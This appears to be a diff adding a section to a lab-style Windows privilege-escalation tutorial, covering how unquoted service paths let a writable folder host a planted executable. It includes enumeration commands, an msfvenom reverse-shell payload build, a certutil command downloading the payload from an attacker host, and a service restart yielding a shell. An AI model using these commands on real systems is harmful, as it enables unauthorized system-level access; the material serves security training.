@@ -386,7 +386,7 @@ sc stop dllsvc & sc start dllsvc
 
 DLL Hijacking done.
 
-###  Skeleton Code To Chnage User Password
+###  Skeleton Code To Change User Password
 
 ```
            
@@ -410,5 +410,165 @@ Now let confirm it.
 ![image](https://user-images.githubusercontent.com/69868171/154288471-b48d131b-2777-4fa0-8d93-59c85a418bee.png)
 
 DLL hijack and password for user `jack` was change successfully.
+
+
+### Unquoted Service Path
+
+When a service starts in Windows, the operating system has to find and run an executable file. For example, you will see in the terminal output below that the "netlogon" service (responsible for authenticating users in the domain) is, in fact, referring to the `C:\Windows\system32\lsass.exe binary.`
+
+```
+C:\Users\user>sc qc netlogon
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: netlogon
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\lsass.exe
+        LOAD_ORDER_GROUP   : MS_WindowsRemoteValidation
+        TAG                : 0
+        DISPLAY_NAME       : Netlogon
+        DEPENDENCIES       : LanmanWorkstation
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\user>
+```
+
+In the example above, when the service is launched, Windows follows a search order similar to what we have seen in the previous task. Imagine now we have a service (e.g. srvc) which has a binary path set to `C:\Program Files\topservice folder\subservice subfolder\srvc.exe`
+
+
+To the human eye, this path would be merely different than `"C:\Program Files\topservice folder\subservice subfolder\srvc.exe".` We would understand the service is trying to run `srvc.exe.`
+
+
+Windows approaches the matter slightly differently. It knows the service is looking for an executable file, and it will start looking for it. If the path is written between quotes, Windows will directly go to the correct location and launch `service.exe.` 
+
+
+However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append ".exe" and start looking for an executable, starting with the shortest possible path. In our example, this would be `C:\Program.exe.` If `program.exe` is not available, the second attempt will be to run `topservice.exe` under `C:\Program Files\.` If this also fails, another attempt will be made for `C:\Program Files\topservice folder\subservice.exe`. This process repeats until the executable is found. 
+
+
+Knowing this, if we can place an executable in a location we know the service is looking for one, it may be run by the service. 
+
+
+As you can understand, exploiting an unquoted service path vulnerability will require us to have write permissions to a folder where the service will look for an executable. 
+
+### Finding Unquoted Service Path Vulnerabilities
+
+Tools like winPEAS and PowerUp.ps1 will usually detect unquoted service paths. But we will need to make sure other requirements to exploit the vulnerability are filled. These are;
+
+    Being able to write to a folder on the path
+    Being able to restart the service
+If either of these conditions is not met, successful exploitation may not be possible. 
+
+The command below will list services running on the target system. The result will also print out other information, such as the display name and path. 
+
+```
+wmic service get name,displayname,pathname,startmode
+```
+
+The command may show some Windows operating system folders. As you will not have "write" privileges on those with a limited user, these are not valid candidates.
+
+
+Going over the output of this command on the target machine, you will notice that the `"unquotedsvc"` service has a path that is not written between quotes. 
+
+
+Once we have located this service, we will have to make sure other conditions to exploit this vulnerability are met.
+
+
+You can further check the binary path of this service using the command below: 
+
+```
+sc qc unquotedsvc
+```
+
+Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.
+
+```
+.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
+
+```
+
+The output will list user groups with read (R) and write (W) privileges on the "Program Files" folder.
+
+We now have found a folder we can write to. As this folder is also in the service's binary path, we know the service will try to run an executable with the name of the first word of the folder name. 
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1337 -f exe > executable_name.exe
+```
+
+The command above will generate a reverse shell. This means that it will try to connect back to our attacking machine. We will need to launch Metasploit or Ncat and configure it to accept incoming connection.
+
+Once you have generated and moved the file to the correct location on the target machine, you will need to restart the vulnerable service.
+
+
+You can use the `sc start unquotedsvc` command to start the service. 
+
+### Now Hands On Pratical
+
+Now let open command prompt and run 
+
+```
+wmic service get name,displayname,pathname,startmode
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154297740-092a1714-8ca2-4287-aec3-cefc590a02c1.png)
+
+
+We can confirm the full path with `sc qc unquotedsvc` 
+
+
+![image](https://user-images.githubusercontent.com/69868171/154298071-33bbab98-0580-4a79-ac1d-4f46bf1c795d.png)
+ 
+Between it not quoted so we just need to confirm now if we have write access to any of the folder path using `accesschk64.exe` to mett the requirement to exploit the vulnerability.
+
+```
+C:\Users\user>C:\Users\user\Desktop\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
+
+Accesschk v6.10 - Reports effective permissions for securable objects
+Copyright (C) 2006-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Program Files
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+
+C:\Users\user>C:\Users\user\Desktop\accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+
+Accesschk v6.10 - Reports effective permissions for securable objects
+Copyright (C) 2006-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Program Files\Unquoted Path Service
+  RW BUILTIN\Users
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+
+C:\Users\user>
+```
+
+Boom seems we have write access to the folder path `C:\Program Files\Unquoted Path Service\` and we know the next thing it will start looking for an executable file , starting with the shortest possible path `common` now let generate our executable file and transfer it to the folder path that we have write access to.
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1337 -f exe > common.exe
+```
+
+Now let transfer it to the target.
+
+```
+certutil -urlcache -split -f "http://IP:PORT/common.exe" common.exe
+```
+
+![image](https://user-images.githubusercontent.com/69868171/154307592-a4238cf8-a907-46dd-9d3d-23f935cddc0b.png)
+
+Now let start our ncat listener for incoming connection. Now let start unquotedsvc.
+
+```
+sc start unquotedsvc
+```
+
+Now going back to our listener Boom we have shell.
+
+![image](https://user-images.githubusercontent.com/69868171/154308391-750816fe-52bb-42c3-b3a6-af894eda83f9.png)
 
 
